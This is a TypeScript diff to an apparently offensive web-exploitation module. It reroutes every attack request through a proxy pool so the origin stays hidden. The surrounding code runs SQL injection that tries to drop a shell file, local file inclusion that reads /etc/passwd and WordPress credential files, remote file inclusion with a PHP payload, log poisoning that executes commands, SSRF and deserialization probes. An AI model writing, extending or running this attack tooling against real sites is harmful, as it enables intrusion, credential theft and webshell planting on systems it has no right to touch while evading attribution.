@@ -12,6 +12,14 @@
 
 import { fetchWithPoolProxy } from "./proxy-pool";
 
+// Helper: wrap fetch with proxy pool
+async function indirectFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
+  return response;
+}
+
+
 export interface IndirectAttackResult {
   vector: string;
   success: boolean;
@@ -95,7 +103,7 @@ async function trySqlInjection(config: IndirectAttackConfig): Promise<IndirectAt
     // Get baseline response
     let baselineLength = 0;
     try {
-      const baseResp = await fetch(testUrl, { signal: AbortSignal.timeout(timeout) });
+      const baseResp = await indirectFetch(testUrl, { signal: AbortSignal.timeout(timeout) });
       const baseText = await baseResp.text();
       baselineLength = baseText.length;
     } catch {
@@ -110,7 +118,7 @@ async function trySqlInjection(config: IndirectAttackConfig): Promise<IndirectAt
       try {
         const injUrl = testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`);
         const startTime = Date.now();
-        const resp = await fetch(injUrl, { signal: AbortSignal.timeout(timeout) });
+        const resp = await indirectFetch(injUrl, { signal: AbortSignal.timeout(timeout) });
         const elapsed = Date.now() - startTime;
         const text = await resp.text();
 
@@ -176,14 +184,14 @@ async function trySqlInjection(config: IndirectAttackConfig): Promise<IndirectAt
 
         try {
           const injUrl = testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`);
-          await fetch(injUrl, { signal: AbortSignal.timeout(timeout) });
+          await indirectFetch(injUrl, { signal: AbortSignal.timeout(timeout) });
 
           // Check if file was created
           const webRoots = ["/var/www/html/", "/var/www/", "/home/www/"];
           for (const root of webRoots) {
             const fileUrl = `${baseUrl}/${config.shellFilename}`;
             try {
-              const checkResp = await fetch(fileUrl, {
+              const checkResp = await indirectFetch(fileUrl, {
                 method: "HEAD",
                 signal: AbortSignal.timeout(5000),
               });
@@ -288,7 +296,7 @@ async function tryLfi(config: IndirectAttackConfig): Promise<IndirectAttackResul
         const injUrl = testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`);
         log("lfi", `Testing LFI: ${payload.slice(0, 40)}...`);
 
-        const resp = await fetch(injUrl, { signal: AbortSignal.timeout(timeout) });
+        const resp = await indirectFetch(injUrl, { signal: AbortSignal.timeout(timeout) });
         const text = await resp.text();
 
         // Check for /etc/passwd content
@@ -306,7 +314,7 @@ async function tryLfi(config: IndirectAttackConfig): Promise<IndirectAttackResul
           // Try to read wp-config.php for credentials
           const wpConfigPayload = payload.replace("etc/passwd", "var/www/html/wp-config.php");
           try {
-            const wpResp = await fetch(
+            const wpResp = await indirectFetch(
               testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(wpConfigPayload)}`),
               { signal: AbortSignal.timeout(timeout) },
             );
@@ -396,7 +404,7 @@ async function tryRfi(config: IndirectAttackConfig): Promise<IndirectAttackResul
         const injUrl = testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(rfiUrl)}`);
         log("rfi", `Testing RFI: ${rfiUrl.slice(0, 40)}...`);
 
-        const resp = await fetch(injUrl, {
+        const resp = await indirectFetch(injUrl, {
           method: rfiUrl === "php://input" ? "POST" : "GET",
           body: rfiUrl === "php://input" ? "<?php echo 'RFI_TEST_SUCCESS'; ?>" : undefined,
           signal: AbortSignal.timeout(timeout),
@@ -451,7 +459,7 @@ async function tryLogPoisoning(config: IndirectAttackConfig): Promise<IndirectAt
   const poisonedUA = `Mozilla/5.0 ${phpPayload}`;
 
   try {
-    await fetch(baseUrl, {
+    await indirectFetch(baseUrl, {
       method: "GET",
       headers: { "User-Agent": poisonedUA },
       signal: AbortSignal.timeout(timeout),
@@ -481,7 +489,7 @@ async function tryLogPoisoning(config: IndirectAttackConfig): Promise<IndirectAt
         const testUrl = `${baseUrl}/?${param}=${encodeURIComponent(traversal)}&cmd=id`;
         log("log_poison", `Trying log inclusion: ${logPath}`);
 
-        const resp = await fetch(testUrl, { signal: AbortSignal.timeout(timeout) });
+        const resp = await indirectFetch(testUrl, { signal: AbortSignal.timeout(timeout) });
         const text = await resp.text();
 
         // Check if command executed
@@ -561,7 +569,7 @@ async function trySsrf(config: IndirectAttackConfig): Promise<IndirectAttackResu
         const injUrl = testUrl.replace(/=([^&]*)/, `=${encodeURIComponent(target)}`);
         log("ssrf", `Testing SSRF: ${target.slice(0, 40)}...`);
 
-        const resp = await fetch(injUrl, { signal: AbortSignal.timeout(timeout) });
+        const resp = await indirectFetch(injUrl, { signal: AbortSignal.timeout(timeout) });
         const text = await resp.text();
 
         // Check for internal content indicators
@@ -634,7 +642,7 @@ async function tryDeserialization(config: IndirectAttackConfig): Promise<Indirec
         const testUrl = `${baseUrl}/?${param}=${encodeURIComponent(payload)}`;
         log("deserialization", `Testing deserialization on ?${param}=...`);
 
-        const resp = await fetch(testUrl, { signal: AbortSignal.timeout(timeout) });
+        const resp = await indirectFetch(testUrl, { signal: AbortSignal.timeout(timeout) });
         const text = await resp.text();
 
         // Check for deserialization errors (indicates the app is trying to unserialize)
@@ -662,7 +670,7 @@ async function tryDeserialization(config: IndirectAttackConfig): Promise<Indirec
 
     // Also try POST with serialized data
     try {
-      const resp = await fetch(baseUrl, {
+      const resp = await indirectFetch(baseUrl, {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: `${param}=${encodeURIComponent(deserPayloads[0])}`,
